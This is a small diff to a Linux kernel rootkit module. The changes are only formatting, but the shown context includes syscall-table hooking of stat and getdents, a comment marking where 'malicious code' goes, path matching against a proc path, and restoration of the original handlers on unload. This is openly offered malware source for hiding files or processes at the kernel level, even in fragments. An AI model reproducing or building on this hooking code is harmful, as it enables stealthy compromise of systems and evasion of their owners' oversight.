@@ -68,7 +68,7 @@ void init_buffer(void) {
 asmlinkage int new_stat(const struct pt_regs *regs) {
 
 	char *path = (char*) regs->di;
-
+	
        // perform our malicious code here- the HOOK!
        if (strstr(path, proc_path) != NULL) {
 	       
@@ -136,7 +136,7 @@ static int __init rootkit_init(void) {
 
         set_addr_ro((unsigned long) sys_call_table);
         return 0;
-        }
+}
 
 static void __exit rootkit_exit(void) {
 
@@ -148,8 +148,6 @@ static void __exit rootkit_exit(void) {
 	sys_call_table[__NR_getdents] = (unsigned long) old_getdents;
 
         set_addr_ro((unsigned long) sys_call_table);
-
-        return;
 }
 
 module_init(rootkit_init);
